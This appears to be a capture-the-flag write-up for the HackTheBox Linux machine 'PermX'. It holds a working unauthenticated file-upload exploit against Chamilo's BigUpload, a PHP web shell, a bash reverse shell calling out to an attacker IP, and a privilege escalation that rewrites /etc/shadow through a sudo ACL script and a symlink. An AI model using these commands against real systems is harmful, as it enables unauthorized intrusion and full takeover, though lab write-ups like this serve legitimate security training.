---
layout: post
title: "PermX"
description: "PermX is an Easy rated Linux machine on HTB."
categories: [CTF,HTB]
tags: [Linux,Easy]
author: g
---

## Nmap Scan
![Pasted image 20240715112814.png](/images/Pasted image 20240715112814.png){: .normal }


### Enumerate HTTP (Port 80)
Perform directory busting using Gobuster.
![Pasted image 20240715112809.png](/images/Pasted image 20240715112809.png){: .normal }

Ffuf subdomain enumeration result.
![Pasted image 20240715112801.png](/images/Pasted image 20240715112801.png){: .normal }


### Enumerating Subdomain (lms.permx.htb)
Main login page.
![Pasted image 20240715112756.png](/images/Pasted image 20240715112756.png){: .normal }

Found robots.txt.
![Pasted image 20240715112751.png](/images/Pasted image 20240715112751.png){: .normal }

In the /documentation/ subdirectory we discover that the version running is 1.11.
![Pasted image 20240715112743.png](/images/Pasted image 20240715112743.png){: .normal width="500" }

Found CVE: [https://starlabs.sg/advisories/23/23-4220/](https://starlabs.sg/advisories/23/23-4220/)

Verify the existence of BigUpload in the application:
![Pasted image 20240715112736.png](/images/Pasted image 20240715112736.png){: .normal width="500" }

Gain RCE:
```bash
$ echo '<?php system("id"); ?>' > rce.php
$ curl -F 'bigUploadFile=@rce.php' '<http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported>'
The file has successfully been uploaded.
$ curl '<http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php>'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Shell as www-data:
```bash
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.15.32/443 0>&1'"); ?>
```


### Lateral movement
Found DB credentials.
![Pasted image 20240715112730.png](/images/Pasted image 20240715112730.png){: .normal }

Use the DB credentials to SSH as the mtz user (found in home directory).
![Pasted image 20240715112724.png](/images/Pasted image 20240715112724.png){: .normal }

User.txt: `863fa15050c164ae334f008b2b4f70e8`
![Pasted image 20240715112720.png](/images/Pasted image 20240715112720.png){: .normal width="500" }



## Privilege Escalation
Sudo -l output.
![Pasted image 20240715112712.png](/images/Pasted image 20240715112712.png){: .normal }

The script in question allows us to modify permissions on files: [Link](https://linux.die.net/man/1/setfacl).
![Pasted image 20240715112702.png](/images/Pasted image 20240715112702.png){: .normal width="600" }

However the content must be in the mtzâ€™s home directory, to bypass this we can create a symlink:
```bash
ln -s / symlink
```

We can now invoke the script and change the permissions on the shadow file for the root user, this way we can switch to the root user using our own specified password.
```bash
sudo /opt/acl.sh mtz rwx /home/mtz/symlink/etc/shadow
```

Generate the password (root):
![Pasted image 20240715112655.png](/images/Pasted image 20240715112655.png){: .normal }

Update the shadow file with the hash and change to the root user using the root password:
![Pasted image 20240715112650.png](/images/Pasted image 20240715112650.png){: .normal width="500" }

Root.txt: `9644db72db3b3c64a3b580ba2e47b6ca`
![Pasted image 20240715112646.png](/images/Pasted image 20240715112646.png){: .normal width="500" }


## PWNED!!!
![Pasted image 20240715112641.png](/images/Pasted image 20240715112641.png){: .normal }
